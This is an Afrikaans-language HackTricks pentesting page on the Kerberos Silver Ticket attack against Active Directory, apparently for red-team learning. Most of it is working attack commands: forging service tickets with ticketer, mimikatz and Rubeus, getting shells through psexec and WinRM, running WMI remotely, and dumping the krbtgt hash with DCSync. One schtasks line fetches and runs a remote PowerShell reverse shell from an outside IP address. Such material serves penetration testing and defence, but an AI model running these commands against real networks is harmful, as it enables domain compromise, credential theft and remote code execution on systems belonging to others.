# Silwermatriek

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks), en begin om belonings tot **$100,000** te verdien!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silwermatriek

Die **Silwermatriek**-aanval behels die uitbuiting van dienskaartjies in Aktiewe Gids (AD) omgewings. Hierdie metode steun op **die verkryging van die NTLM-hash van 'n diensrekening**, soos 'n rekenaarrekening, om 'n Kaartjieverleningsdiens (TGS) kaartjie te vervals. Met hierdie vervalste kaartjie kan 'n aanvaller toegang verkry tot spesifieke dienste op die netwerk, **deur enige gebruiker te simuleer**, gewoonlik met die doel om administratiewe voorregte te verkry. Daar word beklemtoon dat die gebruik van AES-sleutels vir die vervalsing van kaartjies meer veilig en minder opspoorbaar is.

Vir kaartjie-vervaardiging word verskillende gereedskap gebruik gebaseer op die bedryfstelsel:

### Op Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Op Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer se lêersisteem te verkry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir take en WMI-navrae.

## Beskikbare Dienste

| Diens Tipe                                 | Diens Silwer Kaartjies                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Afhanklik van OS ook:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In sommige gevalle kan jy net vra vir: WINRM</p> |
| Geskeduleerde Take                         | HOST                                                                       |
| Windows Lêerdeling, ook psexec              | CIFS                                                                       |
| LDAP-operasies, ingesluit DCSync            | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Goue Kaartjies                             | krbtgt                                                                     |

Met **Rubeus** kan jy **vir almal** hierdie kaartjies vra deur die parameter te gebruik:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silwer kaartjie Gebeurtenis ID's

* 4624: Rekening Aanmelding
* 4634: Rekening Afgemeld
* 4672: Admin Aanmelding

## Misbruik van Dienskaartjies

In die volgende voorbeelde, laat ons aanvaar dat die kaartjie verkry is deur die administrateurrekening te impersoneer.

### CIFS

Met hierdie kaartjie sal jy in staat wees om toegang tot die `C$` en `ADMIN$` vouer te verkry via **SMB** (indien blootgestel) en lêers na 'n deel van die afgeleë lêersisteem te kopieer deur iets soos:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
### GASHEER

Met hierdie toestemming kan jy geskeduleerde take op afgeleë rekenaars genereer en willekeurige bevele uitvoer:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### GAS + RPCSS

Met hierdie kaartjies kan jy **WMI uitvoer in die slagoffer se stelsel**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Vind **meer inligting oor wmiexec** op die volgende bladsy:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### GAS + WSMAN (WINRM)

Met winrm-toegang oor 'n rekenaar kan jy **daarop toegang kry** en selfs 'n PowerShell kry:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
### LDAP

Met hierdie voorreg kan jy die DC-databasis dump met **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Leer meer oor DCSync** op die volgende bladsy:

## Verwysings

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings te verdien tot **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
